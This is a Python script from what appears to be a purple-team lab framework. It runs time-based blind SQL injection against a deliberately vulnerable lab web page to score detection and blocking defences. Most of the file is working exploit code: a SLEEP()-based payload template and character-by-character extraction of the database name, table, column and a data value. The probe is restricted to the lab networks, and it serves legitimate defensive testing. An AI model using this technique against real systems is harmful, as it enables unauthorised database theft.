# SPDX-License-Identifier: Apache-2.0
"""SecLoop reference SQLi probe -- time-based blind injection against the lab target.

This is the *only* attack script that ships with SecLoop.  It exercises the
deliberately vulnerable lab target in ``target/webapp/search.php`` on the
isolated ``192.168.57.0/24`` Vagrant network and reports its progress through
the machine-readable result contract of ``docs/INTERFACES.md`` section 2.

What it does
------------
* Pure ``SLEEP()``-based **time blind** injection -- no boolean markers, no
  error messages, so it also works against a target that leaks nothing.
* Five fixed stages, weighted ``0.1 / 0.1 / 0.2 / 0.2 / 0.4``:

  ====================  ==========================================  ========
  stage                 meaning                                     weight
  ====================  ==========================================  ========
  ``db_name_length``    length of ``database()``                    0.10
  ``db_name``           ``database()`` itself                       0.10
  ``table_name``        first table of the current schema           0.20
  ``column_name``       first column of that table                  0.20
  ``dump_row``          one value of that column                    0.40
  ====================  ==========================================  ========

* ``--mode binary`` (default) bisects both lengths and ASCII codes;
  ``--mode linear`` walks a printable charset instead, which is slower but
  produces a different, easier-to-read request pattern.
* Before spending minutes on extraction, the probe *proves* that the oracle
  works: it measures a baseline request and requires a known-true condition to
  really sleep while a known-false condition does not.  If that check fails --
  e.g. because ``block_ip`` dropped the attacker -- every stage is reported as
  failed with ``score == 0.0`` and an ``error`` message.

Result contract
---------------
Exactly one line is written to **stdout**::

    [RESULT] {"attack_mode":"sqli","target_ip":"192.168.57.200",...,"error":null}

Human-readable progress and diagnostics go to **stderr** through :mod:`logging`,
so a consumer can parse stdout without filtering anything.  Any failure still
emits a syntactically valid ``[RESULT]`` line with ``error`` set, every stage
``false`` and ``score == 0.0``; the process exit status stays ``0`` once that
line has been written, because the JSON -- not the exit code -- carries the
outcome.

Safety
------
The probe refuses to run against anything outside the lab networks listed in
:data:`ALLOWED_TARGET_NETS` (``192.168.57.0/24`` plus loopback for a local dry
run).  There is intentionally no override flag.

Dependencies
------------
Python 3 standard library plus ``requests`` -- the Kali rolling image ships
``requests`` via ``vagrant/provision/attacker_setup.sh``; nothing else is
imported so a rolling-release box cannot break the probe.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import logging
import string
import sys
import time
import urllib.parse
from typing import Callable, Sequence

try:  # ``requests`` is the single third-party dependency of the attack side.
    import requests
except ImportError:  # pragma: no cover - only reachable on a broken Kali image
    requests = None  # type: ignore[assignment]

LOGGER = logging.getLogger("secloop.attacks.sqli_lab")

__all__ = ["main", "SqliLabProbe", "ProbeError", "ATTACK_MODE", "STAGE_WEIGHTS"]

# --------------------------------------------------------------------------- #
# Contract constants (docs/INTERFACES.md sections 2.1 and 2.3)
# --------------------------------------------------------------------------- #

#: Prefix of the single machine-readable stdout line; the trailing space is part
#: of the frozen contract.
RESULT_PREFIX = "[RESULT] "

#: Value of the ``attack_mode`` field -- SQL injection is the only shipped mode.
ATTACK_MODE = "sqli"

#: The five stages, in contract order, with their fixed weights.
STAGE_WEIGHTS: tuple[tuple[str, float], ...] = (
    ("db_name_length", 0.1),
    ("db_name", 0.1),
    ("table_name", 0.2),
    ("column_name", 0.2),
    ("dump_row", 0.4),
)

# --------------------------------------------------------------------------- #
# Lab topology (docs/INTERFACES.md section 1)
# --------------------------------------------------------------------------- #

DEFAULT_TARGET_IP = "192.168.57.200"
DEFAULT_TARGET_PORT = 80
#: The SOC runs this probe through ``battlefield/soc/attack_commands.json``, which
#: pins ``--delay``/``--timeout`` (1 s / 8 s).  These standalone defaults
#: deliberately equal those values so running the script by hand behaves exactly like
#: running it under the SOC.  A drift-guard test compares all three copies (the
#: registry, this file, and the controller's inline fallback).
DEFAULT_DELAY_S = 1.0
DEFAULT_TIMEOUT_S = 8.0

#: Networks the probe is allowed to touch.  Loopback is included only so the
#: lab webapp can be exercised locally without spinning up a VM.
ALLOWED_TARGET_NETS: tuple[str, ...] = ("192.168.57.0/24", "127.0.0.0/8")

HEALTH_PATH = "/index.php"
SEARCH_PATH = "/search.php"

#: Literal returned by the target health anchor (docs/INTERFACES.md section 11).
HEALTH_MARKER = "SecLoop target OK"

USER_AGENT = "SecLoop-lab-sqli/1.0 (+isolated-lab-only)"

# --------------------------------------------------------------------------- #
# Payload construction
# --------------------------------------------------------------------------- #

#: Characters kept literal in the request URI.  Everything else is
#: percent-encoded by :func:`_encode_payload` before ``requests`` sees the URL.
#:
#: * ``'`` ``(`` ``)`` ``,`` ``=`` stay raw: the SQL string break-out and the
#:   function calls (``IF(``, ``SLEEP(``, ``ASCII(SUBSTR(``) must be visible in
#:   ``http_uri`` for the Suricata rules in ``target/suricata/local.rules``;
#: * spaces become ``%20``, so the rules tolerate the encoded form too
#:   (see the ``AND IF(`` rule);
#: * ``#`` ``&`` ``+`` ``;`` are deliberately *not* safe, because they would be
#:   read as a URL fragment / query separator / ``+``-as-space instead of as SQL
#:   characters.  They are sent as ``%23`` ``%26`` ``%2B`` ``%3B`` and decoded
#:   back by PHP, so the SQL semantics are unchanged;
#: * percent-encoding happens exactly once: urllib3 keeps ``%xx`` as written
#:   (``%`` is in its own safe set), so nothing is double-encoded in transit.
_URL_SAFE = "'()*,=/:@[]~!$-"

#: Base value of the injectable ``id`` parameter, i.e. the URL fragment before
#: the injected suffix.
_BASE_ID = "1"

#: Suffix template: close the quoted literal, add a conditional ``SLEEP()`` and
#: comment out the trailing quote of the vulnerable statement.
_BLIND_SUFFIX = "' AND IF({condition},SLEEP({delay}),0)-- -"

#: Expressions the stages pluck out of the schema.
DB_NAME_EXPR = "database()"
FIRST_TABLE_EXPR = (
    "(SELECT table_name FROM information_schema.tables "
    "WHERE table_schema=database() ORDER BY table_name LIMIT 0,1)"
)
FIRST_COLUMN_EXPR = (
    "(SELECT column_name FROM information_schema.columns "
    "WHERE table_schema=database() AND table_name={table} "
    "ORDER BY ordinal_position LIMIT 0,1)"
)
_FIRST_VALUE_EXPR = "(SELECT {column} FROM {table} LIMIT 0,1)"

#: Extraction bounds -- generous, but bounded so a hostile/odd schema cannot
#: turn the probe into an infinite loop.
MAX_DB_NAME_LEN = 32
MAX_IDENTIFIER_LEN = 32
MAX_VALUE_LEN = 64

_ASCII_MIN = 0x20  # space
_ASCII_MAX = 0x7E  # '~'
_LINEAR_CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-@!#$.:"

#: A ``SLEEP(d)`` counts as "condition true" from ``baseline + d * ratio`` on.
_SLEEP_TRUE_RATIO = 0.5
_MIN_SLEEP_DELTA_S = 0.25
_MAX_LOGGED_ORACLE_ERRORS = 3


class ProbeError(RuntimeError):
    """Fatal probe condition, classified by :attr:`kind`.

    The classification is what lets a consumer tell "the defence kept me out" from "our own
    harness is broken" (``docs/INTERFACES.md`` §2.1). Without it, both produce an all-false
    stage list, so a broken run and a perfect block are the same bytes on the wire.

    Kinds (``docs/INTERFACES.md`` §2.1):

    * ``target-unreachable`` -- the attacker could not reach the target: a connect/timeout
      failure, a health anchor that did not answer ``200``, or one that answered without the
      contract marker. **This is the kind a successful block produces.**
    * ``oracle-unconfirmed`` -- the target answers but the SQLi oracle cannot be established
      (calibration), so any extraction would be noise.
    * ``dependency-missing`` -- the probe's own prerequisites are absent (``requests``).
    * ``config-invalid`` -- the invocation is wrong (a target outside the lab networks).
    * ``unclassified`` -- anything else. Consumers must treat this as **unmeasured**: the
      default has to be "we do not know", never "the defence worked".
    """

    def __init__(self, message: str, *, kind: str = "unclassified") -> None:
        super().__init__(message)
        self.kind = kind


#: Kinds a consumer is allowed to see in ``abort_kind``.
ABORT_KINDS = frozenset(
    {"target-unreachable", "oracle-unconfirmed", "dependency-missing", "config-invalid",
     "unclassified"}
)


def _encode_payload(payload: str) -> str:
    """Percent-encode a payload exactly once, keeping SQL metacharacters raw."""
    return urllib.parse.quote(payload, safe=_URL_SAFE)


def _sql_number(value: float) -> str:
    """Render a delay for embedding into SQL (``2.0`` -> ``2``)."""
    return f"{value:g}"


def _quote_identifier(name: str) -> str:
    """Backtick-quote a schema identifier extracted from ``information_schema``."""
    return "`" + name.replace("`", "``") + "`"


def _blank_stages() -> list[dict[str, object]]:
    """All-failed stage list, used by every degraded exit path."""
    return [
        {"name": name, "success": False, "weight": weight} for name, weight in STAGE_WEIGHTS
    ]


def _blank_extracted() -> dict[str, object]:
    """Empty extraction record, one ``None`` per stage."""
    return {name: None for name, _ in STAGE_WEIGHTS}


def _allowed_target(host: str) -> bool:
    """True when ``host`` is inside one of the isolated lab networks."""
    try:
        address = ipaddress.ip_address(host)
    except ValueError:
        return False
    return any(address in ipaddress.ip_network(cidr) for cidr in ALLOWED_TARGET_NETS)


class SqliLabProbe:
    """Time-blind SQLi runner for the SecLoop lab target."""

    def __init__(
        self,
        target_ip: str,
        port: int,
        delay: float,
        timeout: float,
        mode: str,
        session: "requests.Session",
    ) -> None:
        self.target_ip = target_ip
        self.port = port
        self.delay = delay
        self.timeout = timeout
        self.mode = mode
        self.session = session
        self.base_url = f"http://{target_ip}:{port}"
        self.baseline_s = 0.0
        self.threshold_s = 0.0
        self.requests_sent = 0
        self.oracle_errors = 0
        self._logged_oracle_errors = 0

    # -- low level ---------------------------------------------------------- #

    def _url(self, suffix: str) -> str:
        return f"{self.base_url}{SEARCH_PATH}?id={_BASE_ID}{_encode_payload(suffix)}"

    def _timed_get(self, suffix: str) -> float:
        """GET ``search.php`` with ``suffix`` appended to ``id``; return elapsed s."""
        url = self._url(suffix)
        started = time.monotonic()
        response = self.session.get(url, timeout=self.timeout, allow_redirects=False)
        elapsed = time.monotonic() - started
        self.requests_sent += 1
        LOGGER.debug("GET %s -> HTTP %s in %.3fs", url, response.status_code, elapsed)
        return elapsed

    def _blind_suffix(self, condition: str) -> str:
        return _BLIND_SUFFIX.format(condition=condition, delay=_sql_number(self.delay))

    def _sleep_timing(self, condition: str) -> float | None:
        """Measure the true-condition request; ``None`` on a network failure."""
        try:
            return self._timed_get(self._blind_suffix(condition))
        except Exception as exc:  # requests raises a whole family of exceptions
            self._note_oracle_error(exc)
            return None

    def _note_oracle_error(self, exc: BaseException) -> None:
        self.oracle_errors += 1
        if self._logged_oracle_errors < _MAX_LOGGED_ORACLE_ERRORS:
            self._logged_oracle_errors += 1
            LOGGER.warning(
                "oracle request failed (%d so far): %s: %s",
                self.oracle_errors,
                exc.__class__.__name__,
                exc,
            )

    def _oracle(self, condition: str) -> bool:
        """True when ``condition`` holds on the target (i.e. the response slept).

        Network failures are treated as "condition false", which is what makes a
        dropped connection (``block_ip``) score zero instead of crashing.
        """
        try:
            elapsed = self._timed_get(self._blind_suffix(condition))
        except Exception as exc:
            self._note_oracle_error(exc)
            return False
        return elapsed >= self.threshold_s

    # -- pre-flight --------------------------------------------------------- #

    def check_health(self) -> None:
        """Verify the lab health anchor answers 200 with the contract marker."""
        url = f"{self.base_url}{HEALTH_PATH}"
        try:
            response = self.session.get(url, timeout=self.timeout, allow_redirects=False)
        except Exception as exc:
            raise ProbeError(
                f"lab target unreachable at {url}: {exc.__class__.__name__}: {exc}",
                kind="target-unreachable",
            ) from exc
        self.requests_sent += 1
        if response.status_code != 200:
            raise ProbeError(
                f"health anchor {url} returned HTTP {response.status_code}, expected 200",
                kind="target-unreachable",
            )
        if HEALTH_MARKER not in response.text:
            raise ProbeError(
                f"health anchor {url} does not contain {HEALTH_MARKER!r}",
                kind="target-unreachable",
            )
        LOGGER.info("health anchor OK: %s", url)

    def calibrate(self) -> None:
        """Prove the time-based oracle actually works before extracting anything."""
        try:
            self.baseline_s = self._timed_get("")
        except Exception as exc:
            raise ProbeError(
                f"cannot query {self.base_url}{SEARCH_PATH}: {exc.__class__.__name__}: {exc}",
                kind="oracle-unconfirmed",
            ) from exc
        self.threshold_s = self.baseline_s + max(self.delay * _SLEEP_TRUE_RATIO, _MIN_SLEEP_DELTA_S)
        LOGGER.info(
            "calibration: baseline %.3fs, sleep threshold %.3fs (delay=%ss, timeout=%ss)",
            self.baseline_s,
            self.threshold_s,
            _sql_number(self.delay),
            _sql_number(self.timeout),
        )

        true_elapsed = self._sleep_timing("1=1")
        if true_elapsed is None:
            raise ProbeError(
                "time-based SQLi oracle unusable: the deliberate true-condition request "
                f"to {self.base_url}{SEARCH_PATH} failed at the network level",
                kind="oracle-unconfirmed",
            )
        if true_elapsed < self.threshold_s:
            raise ProbeError(
                "time-based SQLi oracle not confirmed: true-condition request took "
                f"{true_elapsed:.3f}s, below the {self.threshold_s:.3f}s sleep threshold "
                f"(is {self.base_url}{SEARCH_PATH} injectable and is SLEEP() reaching the DB?)",
                kind="oracle-unconfirmed",
            )

        false_elapsed = self._sleep_timing("1=0")
        if false_elapsed is not None and false_elapsed >= self.threshold_s:
            raise ProbeError(
                "time-based SQLi oracle is not discriminating: the false-condition request "
                f"also took {false_elapsed:.3f}s (>= {self.threshold_s:.3f}s); "
                "the target may be rate limited or otherwise unusable",
                kind="oracle-unconfirmed",
            )
        LOGGER.info(
            "oracle confirmed: true-condition %.3fs, false-condition %.3fs",
            true_elapsed,
            -1.0 if false_elapsed is None else false_elapsed,
        )

    # -- extraction primitives --------------------------------------------- #

    def _bisect_ascii(self, expression: str, position: int) -> str:
        """Binary-search one character of ``expression``; ``""`` past the end."""
        low, high = _ASCII_MIN, _ASCII_MAX
        while low < high:
            middle = (low + high) // 2
            if self._oracle(f"ASCII(SUBSTR({expression},{position},1))>{middle}"):
                low = middle + 1
            else:
                high = middle
        if self._oracle(f"ASCII(SUBSTR({expression},{position},1))={low}"):
            return chr(low)
        return ""

    def _scan_char(self, expression: str, position: int) -> str:
        """Sequential charset walk for ``--mode linear``; ``""`` past the end."""
        for candidate in _LINEAR_CHARSET:
            if self._oracle(f"SUBSTR({expression},{position},1)='{candidate}'"):
                return candidate
        return ""

    def _bisect_length(self, expression: str, max_len: int) -> int | None:
        """Binary-search ``LENGTH(expression)`` within ``[1, max_len]``."""
        low, high = 1, max_len
        while low < high:
            middle = (low + high) // 2
            if self._oracle(f"LENGTH({expression})>{middle}"):
                low = middle + 1
            else:
                high = middle
        if self._oracle(f"LENGTH({expression})={low}"):
            return low
        return None

    def _scan_length(self, expression: str, max_len: int) -> int | None:
        """Sequential length walk for ``--mode linear``."""
        for candidate in range(1, max_len + 1):
            if self._oracle(f"LENGTH({expression})={candidate}"):
                return candidate
        return None

    def _extract_string(self, expression: str, max_len: int, label: str) -> str:
        """Extract up to ``max_len`` characters, stopping at end-of-string."""
        characters: list[str] = []
        for position in range(1, max_len + 1):
            char = (
                self._bisect_ascii(expression, position)
                if self.mode == "binary"
                else self._scan_char(expression, position)
            )
            if not char:
                break
            characters.append(char)
            LOGGER.info("[%s] %s", label, "".join(characters))
        return "".join(characters)

    def _guarded(self, stage: str, work: Callable[[], object]) -> object:
        """Run one stage, converting any surprise into a logged stage failure."""
        try:
            return work()
        except Exception as exc:  # a broken stage must not abort the whole probe
            LOGGER.warning("stage %s aborted: %s: %s", stage, exc.__class__.__name__, exc)
            return None

    # -- the five contract stages ------------------------------------------ #

    def execute(self) -> tuple[list[dict[str, object]], dict[str, object]]:
        """Run the five weighted stages; returns ``(stages, extracted)``.

        Stage-level failures never raise: the corresponding stage is simply
        reported as unsuccessful, which is exactly what the RTC expects.
        """
        extracted = _blank_extracted()

        # Stage 1 / 5 -- how long is the current database name?
        db_len = self._guarded(
            "db_name_length",
            lambda: (
                self._bisect_length(DB_NAME_EXPR, MAX_DB_NAME_LEN)
                if self.mode == "binary"
                else self._scan_length(DB_NAME_EXPR, MAX_DB_NAME_LEN)
            ),
        )
        if isinstance(db_len, int) and db_len > 0:
            extracted["db_name_length"] = db_len
            LOGGER.info("stage db_name_length: %d", db_len)

        # Stage 2 / 5 -- the database name itself.
        db_name = self._guarded("db_name", lambda: self._extract_string(DB_NAME_EXPR, MAX_DB_NAME_LEN, "db_name"))
        if isinstance(db_name, str) and db_name:
            extracted["db_name"] = db_name
            LOGGER.info("stage db_name: %s", db_name)

        # Stage 3 / 5 -- first table of the current schema (independent of stage 2).
        table_expr = FIRST_TABLE_EXPR
        table_name = self._guarded(
            "table_name", lambda: self._extract_string(table_expr, MAX_IDENTIFIER_LEN, "table_name")
        )
        if isinstance(table_name, str) and table_name:
            extracted["table_name"] = table_name
            LOGGER.info("stage table_name: %s", table_name)

        # Stage 4 / 5 -- first column of that table.
        column_name: str | None = None
        if isinstance(table_name, str) and table_name:
            column_expr = FIRST_COLUMN_EXPR.format(table="'" + table_name.replace("'", "''") + "'")
            column_name = self._guarded(  # type: ignore[assignment]
                "column_name",
                lambda: self._extract_string(column_expr, MAX_IDENTIFIER_LEN, "column_name"),
            )
            if isinstance(column_name, str) and column_name:
                extracted["column_name"] = column_name
                LOGGER.info("stage column_name: %s", column_name)

        # Stage 5 / 5 -- one value of that column.
        if isinstance(table_name, str) and table_name and isinstance(column_name, str) and column_name:
            value_expr = _FIRST_VALUE_EXPR.format(
                column=_quote_identifier(column_name), table=_quote_identifier(table_name)
            )
            dump_value = self._guarded(
                "dump_row", lambda: self._extract_string(value_expr, MAX_VALUE_LEN, "dump_row")
            )
            if isinstance(dump_value, str) and dump_value:
                extracted["dump_row"] = dump_value
                LOGGER.info("stage dump_row: %s", dump_value)

        stages = [
            {
                "name": name,
                "success": extracted[name] is not None,
                "weight": weight,
            }
            for name, weight in STAGE_WEIGHTS
        ]
        return stages, extracted


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #


def _positive_float(text: str) -> float:
    value = float(text)
    if value <= 0:
        raise argparse.ArgumentTypeError("must be greater than zero")
    return value


def _port_number(text: str) -> int:
    value = int(text)
    if not 1 <= value <= 65535:
        raise argparse.ArgumentTypeError("port must be within 1..65535")
    return value


def _parse_args(argv: Sequence[str] | None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "SecLoop reference SQLi probe: SLEEP()-based time-blind injection against "
            "the deliberately vulnerable lab target. Prints one '[RESULT] {json}' line "
            "on stdout (docs/INTERFACES.md section 2.1)."
        ),
        epilog=(
            "The probe only ever talks to the isolated lab networks "
            + ", ".join(ALLOWED_TARGET_NETS)
            + " and has no flag to widen that."
        ),
    )
    parser.add_argument(
        "--target-ip",
        default=DEFAULT_TARGET_IP,
        help=f"lab target (blue VM) IP; default: {DEFAULT_TARGET_IP}",
    )
    parser.add_argument(
        "--port",
        type=_port_number,
        default=DEFAULT_TARGET_PORT,
        help=f"lab target HTTP port; default: {DEFAULT_TARGET_PORT}",
    )
    parser.add_argument(
        "--mode",
        choices=("binary", "linear"),
        default="binary",
        help="character enumeration strategy: 'binary' bisects (~8 requests/char), "
        "'linear' walks a printable charset (~60 requests/char); default: binary",
    )
    parser.add_argument(
        "--delay",
        type=_positive_float,
        default=DEFAULT_DELAY_S,
        help=f"SLEEP() duration in seconds that marks a true condition; default: {DEFAULT_DELAY_S:g}",
    )
    parser.add_argument(
        "--timeout",
        type=_positive_float,
        default=DEFAULT_TIMEOUT_S,
        help=f"per-request HTTP timeout in seconds (auto-raised above --delay); default: {DEFAULT_TIMEOUT_S:g}",
    )
    parser.add_argument(
        "--log-level",
        default="INFO",
        choices=("DEBUG", "INFO", "WARNING", "ERROR"),
        help="progress verbosity on stderr; default: INFO",
    )
    return parser.parse_args(argv)


def _effective_timeout(delay: float, timeout: float) -> float:
    """Make sure a sleeping request cannot time out before its own budget."""
    minimum = delay * 2.0 + 2.0
    if timeout < minimum:
        LOGGER.info("raising --timeout from %ss to %ss so SLEEP(%ss) can complete", timeout, minimum, _sql_number(delay))
        return minimum
    return timeout


def _build_result(
    *,
    target_ip: str,
    port: int,
    mode: str,
    delay: float,
    stages: list[dict[str, object]],
    extracted: dict[str, object],
    oracle_errors: int,
    requests_sent: int,
    elapsed_s: float,
    error: str | None,
    abort_kind: str | None = None,
) -> dict[str, object]:
    """Assemble the result payload in the frozen field order.

    ``abort_kind`` is ``None`` for a completed run, and otherwise one of
    :data:`ABORT_KINDS`. It is the field that makes "the defence blocked me" and "my own
    harness broke" distinguishable on the wire; both otherwise produce the same all-false
    stage list.
    """
    if abort_kind is not None and abort_kind not in ABORT_KINDS:  # pragma: no cover - guard
        LOGGER.error("abort_kind %r is not in the contract; reporting 'unclassified'", abort_kind)
        abort_kind = "unclassified"
    return {
        "attack_mode": ATTACK_MODE,
        "target_ip": target_ip,
        "target_port": port,
        "target_url": f"http://{target_ip}:{port}{SEARCH_PATH}?id=<id>",
        "mode": mode,
        "delay_s": delay,
        # float(...) keeps the JSON type stable: a failed run must report 0.0,
        # not the integer 0 that an empty sum() would produce (INTERFACES 2.1).
        "score": round(
            float(sum(float(stage["weight"]) for stage in stages if stage["success"])), 6
        ),
        "stages": stages,
        "extracted": extracted,
        "oracle_errors": oracle_errors,
        "requests": requests_sent,
        "elapsed_s": round(elapsed_s, 2),
        "error": error,
        "abort_kind": abort_kind,
    }


def _log_human_summary(result: dict[str, object]) -> None:
    """Write the operator-facing digest to stderr (never to stdout)."""
    LOGGER.info("attack_mode=%s target=http://%s:%s", result["attack_mode"], result["target_ip"], result["target_port"])
    for stage in result["stages"]:  # type: ignore[union-attr]
        LOGGER.info(
            "  stage %-14s success=%-5s weight=%s",
            stage["name"],
            str(stage["success"]).lower(),
            stage["weight"],
        )
    extracted = result["extracted"]
    for name in (name for name, _ in STAGE_WEIGHTS):
        LOGGER.info("  extracted %-14s %r", name, extracted[name])  # type: ignore[index]
    LOGGER.info(
        "score=%s requests=%s oracle_errors=%s elapsed=%ss error=%s",
        result["score"],
        result["requests"],
        result["oracle_errors"],
        result["elapsed_s"],
        result["error"],
    )


def main(argv: Sequence[str] | None = None) -> int:
    """Run the probe and write exactly one ``[RESULT]`` line to stdout."""
    args = _parse_args(argv)
    logging.basicConfig(
        level=getattr(logging, args.log_level),
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
        stream=sys.stderr,
    )

    started = time.monotonic()
    target_ip = str(args.target_ip).strip()
    stages = _blank_stages()
    extracted = _blank_extracted()
    error: str | None = None
    abort_kind: str | None = None
    probe: SqliLabProbe | None = None

    if requests is None:
        error = (
            "python 'requests' is not installed on the attacker VM; "
            "run `python3 -m pip install requests` (see vagrant/provision/attacker_setup.sh)"
        )
        abort_kind = "dependency-missing"
        LOGGER.error("%s", error)
    elif not _allowed_target(target_ip):
        error = (
            f"refusing to probe {target_ip!r}: the SecLoop SQLi probe only targets the isolated "
            f"lab networks {', '.join(ALLOWED_TARGET_NETS)}"
        )
        abort_kind = "config-invalid"
        LOGGER.error("%s", error)
    else:
        timeout = _effective_timeout(args.delay, args.timeout)
        session = requests.Session()
        session.headers.update({"User-Agent": USER_AGENT})
        probe = SqliLabProbe(target_ip, args.port, args.delay, timeout, args.mode, session)
        try:
            probe.check_health()
            probe.calibrate()
            stages, extracted = probe.execute()
        except ProbeError as exc:
            error = str(exc)
            abort_kind = getattr(exc, "kind", "unclassified")
            LOGGER.error("probe aborted [%s]: %s", abort_kind, exc)
        except KeyboardInterrupt:  # pragma: no cover - interactive abort
            error = "interrupted by the operator"
            abort_kind = "unclassified"
            LOGGER.error("%s", error)
        except Exception as exc:  # pragma: no cover - defensive catch-all
            error = f"unexpected failure: {exc.__class__.__name__}: {exc}"
            abort_kind = "unclassified"
            LOGGER.exception("unexpected failure")
        finally:
            session.close()

        if error is not None:
            # Contract: a fatal failure reports every stage as failed with 0.0, and says
            # *why* via `abort_kind` -- that field is what lets a consumer separate "the
            # defence kept me out" from "our harness is broken" (INTERFACES 2.1).
            stages = _blank_stages()
            extracted = _blank_extracted()

    result = _build_result(
        target_ip=target_ip,
        port=int(args.port),
        mode=str(args.mode),
        delay=float(args.delay),
        stages=stages,
        extracted=extracted,
        oracle_errors=0 if probe is None else probe.oracle_errors,
        requests_sent=0 if probe is None else probe.requests_sent,
        elapsed_s=time.monotonic() - started,
        error=error,
        abort_kind=abort_kind,
    )
    _log_human_summary(result)

    # The single machine-readable line -- and the only thing on stdout.
    sys.stdout.write(RESULT_PREFIX + json.dumps(result, ensure_ascii=False) + "\n")
    sys.stdout.flush()
    return 0


if __name__ == "__main__":  # pragma: no cover - CLI wiring
    raise SystemExit(main())
